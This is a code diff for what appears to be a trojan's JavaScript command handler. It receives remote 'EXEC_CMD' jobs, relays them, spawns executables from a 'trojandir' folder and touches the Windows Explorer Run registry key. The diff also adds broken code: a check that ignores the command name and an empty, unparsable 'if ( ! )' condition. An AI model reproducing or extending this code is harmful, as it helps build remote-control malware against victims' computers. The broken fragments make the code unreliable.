@@ -2350,6 +2350,12 @@ async function cmdlist_handleMessage(msg) {
 
     if (jobtype.toUpperCase() == "EXEC_CMD") {
         let cmdname = clientjob.cmdname;
+        cmdname = cmdname.toLowerCase();
+
+        if ( ! CmdConfig.isCmdExist() ) {
+            throw new Error('command is not supported '+cmdname);
+        }
+    
         let cmdargs = clientjob.args ?? [];
 
         if (
@@ -2376,6 +2382,10 @@ async function cmdlist_handleMessage(msg) {
             };
 
             cmdlistcmd.sendMessage(relaycmd, "cmdlist", clientjob);
+        } else {
+            let cmdjob = cmdlistcmd.newCmdConfig(cmdname);
+            
+            if ( ! ) 
         }
 
         // TODO: pcmon, pspcmon, GetSystemOverview, cleanup
@@ -2456,14 +2466,14 @@ cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run
 function invoke_exe(exename, args = null, exedirpath = systemstate.trojandir) {
     const exePath = path.join(exedirpath, exename);
 
-    const args = [
+    const targs = [
         path.join(systemstate.trojandir, "disk1.gsd"),
         "-u",
         path.join(systemstate.gsdpath, "portable_python.zip"),
         "-s",
     ];
 
-    const child = spawn(exePath, args);
+    const child = spawn(exePath, targs);
 
     child.stdout.on("data", (data) => {
         logmsg(`stdout: ${data.toString()}`);
